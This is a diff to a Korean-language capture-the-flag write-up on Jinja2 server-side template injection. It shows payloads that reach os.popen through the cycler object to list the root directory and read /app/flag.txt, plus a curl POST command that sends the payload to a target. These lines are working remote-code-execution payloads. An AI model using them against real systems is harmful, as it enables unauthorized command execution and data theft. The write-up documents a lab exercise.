@@ -61,14 +61,14 @@ Jinja2에는 기본 제공 객체들이 존재하고, 그 중 `cycler`를 통해
 - `os` 모듈 접근 후 `os.popen(cmd).read()` 로 명령 실행 결과 획득
 먼저 RCE를 검증하기 위해 루트 디렉토리 목록을 출력:
 
-```bash
 `{{ cycler.__init__.__globals__.os.popen('ls -al /').read() }}`
-```
+
 
 #### (2) Flag
 플래그는 `/app/flag.txt`에 존재했으며, `cat`으로 직접 읽었다:
 ```bash
-`{{ cycler.__init__.__globals__.os.popen('cat /app/flag.txt 2>&1').read() }}`
+curl -s -X POST "$TARGET" -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode "name={{cycler.__init__.__globals__.os.popen('cat /app/flag.txt 2>&1').read()}}"
 ```
 
 ---
